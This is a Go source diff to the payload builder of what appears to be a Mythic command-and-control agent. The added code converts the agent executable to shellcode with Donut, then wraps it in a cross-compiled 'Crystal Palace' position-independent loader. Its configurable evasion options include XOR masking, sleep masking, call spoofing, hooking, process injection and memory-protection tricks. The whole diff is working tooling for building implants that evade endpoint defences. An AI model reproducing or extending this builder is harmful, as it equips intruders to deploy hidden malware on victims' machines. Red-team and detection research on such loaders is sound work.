@@ -20,6 +20,7 @@ import (
 
 	"erlikhan/pipeline/limelighter"
 	"erlikhan/pipeline/obfuscator"
+	"erlikhan/pipeline/palace"
 	"erlikhan/pipeline/peutils"
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
 	"github.com/MythicMeta/MythicContainer/mythicrpc"
@@ -572,6 +573,10 @@ func build(msg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildRespon
 	if err != nil {
 		return fail("Staging", "clone_cert", err)
 	}
+	palaceSpec, err := fetch(opts.palaceSpec, "palace-spec.spec")
+	if err != nil {
+		return fail("Staging", "palace_spec", err)
+	}
 	buildStep(msg.PayloadUUID, "Staging", true, fmt.Sprintf("%d sources", len(sources)))
 
 	// Tool pre-checks fail cleanly instead of hitting log.Fatal paths.
@@ -599,6 +604,11 @@ func build(msg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildRespon
 	if opts.shellcode {
 		if err := needTool("donut"); err != nil {
 			return fail("Packaging", "shellcode=true", err)
+		}
+	}
+	if opts.loader == "palace" {
+		if err := needTool("x86_64-w64-mingw32-gcc"); err != nil {
+			return fail("Packaging", "loader=palace", err)
 		}
 	}
 	if opts.sign != "none" {
@@ -765,10 +775,22 @@ func build(msg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildRespon
 
 	artifact, filename := exe, msg.PayloadUUID+".exe"
 	if opts.shellcode {
-		if err := runDonut(exe, "agent.bin", opts.arch); err != nil {
-			return fail("Packaging", "donut", err)
+		if opts.loader == "palace" {
+			// Two stages: Donut converts the EXE to shellcode,
+			// then the Palace loader wraps it in a PIC blob.
+			if err := runDonut(exe, "agent.donut.bin", opts.arch); err != nil {
+				return fail("Packaging", "donut", err)
+			}
+			if err := runPalace(serviceRoot, work, "agent.donut.bin", "agent.bin", opts, palaceSpec); err != nil {
+				return fail("Packaging", "palace", err)
+			}
+			artifact, filename = "agent.bin", msg.PayloadUUID+".bin"
+		} else {
+			if err := runDonut(exe, "agent.bin", opts.arch); err != nil {
+				return fail("Packaging", "donut", err)
+			}
+			artifact, filename = "agent.bin", msg.PayloadUUID+".bin"
 		}
-		artifact, filename = "agent.bin", msg.PayloadUUID+".bin"
 	} else if opts.packaging != "none" {
 		peutils.SevenZipPassword = opts.packagePW
 		peutils.MSIAppName, peutils.MSIManufacturer, peutils.MSIScope = opts.msiApp, opts.msiMfr, opts.msiScope
@@ -812,6 +834,63 @@ func runDonut(exe, out, arch string) error {
 		return fmt.Errorf("%s: %w", strings.TrimSpace(stderr.String()), err)
 	}
 	return nil
+}
+
+// runPalace wraps Donut shellcode in the Crystal Palace PIC loader:
+// it stages the C sources, cross-compiles the unity object, links it
+// with the spec DSL, and writes the flat blob to out. Paths in and
+// out are relative to the build workspace.
+func runPalace(serviceRoot, work, in, out string, opts buildOpts, specPath string) error {
+	srcDir := filepath.Join(serviceRoot, "container", "pipeline", "palace", "src")
+	staged := filepath.Join(work, "palacesrc")
+	if err := os.MkdirAll(staged, 0o755); err != nil {
+		return err
+	}
+	for _, pat := range []string{"*.c", "*.h"} {
+		got, err := filepath.Glob(filepath.Join(srcDir, pat))
+		if err != nil {
+			return err
+		}
+		for _, s := range got {
+			raw, err := os.ReadFile(s)
+			if err != nil {
+				return fmt.Errorf("reading palace source: %w", err)
+			}
+			if err := os.WriteFile(filepath.Join(staged, filepath.Base(s)), raw, 0o644); err != nil {
+				return err
+			}
+		}
+	}
+	shellcode, err := os.ReadFile(filepath.Join(work, in))
+	if err != nil {
+		return err
+	}
+	po := palace.Options{
+		Shellcode: shellcode,
+		SrcDir:    staged,
+		ObjDir:    work,
+		SpecPath:  specPath,
+		MaskLen:   opts.palaceMaskLen,
+		XOR:       opts.palaceXOR,
+		PICO:      opts.palacePICO,
+		ROR13:     opts.palaceROR13,
+		NoRWX:     opts.palaceNoRWX,
+		CFG:       opts.palaceCFG,
+		Cleanup:   opts.palaceCleanup,
+		Hooks:     opts.palaceHooks,
+		SleepMask: opts.palaceSleepMsk,
+		Spoof:     opts.palaceSpoof,
+		Inject:    opts.palaceInject,
+		Hosts:     opts.palaceHosts,
+	}
+	if err := po.Compile(); err != nil {
+		return fmt.Errorf("palace compile: %w", err)
+	}
+	blob, err := po.Build()
+	if err != nil {
+		return fmt.Errorf("palace link: %w", err)
+	}
+	return os.WriteFile(filepath.Join(work, out), blob, 0o644)
 }
 
 func checkPackageTools(format string) error {
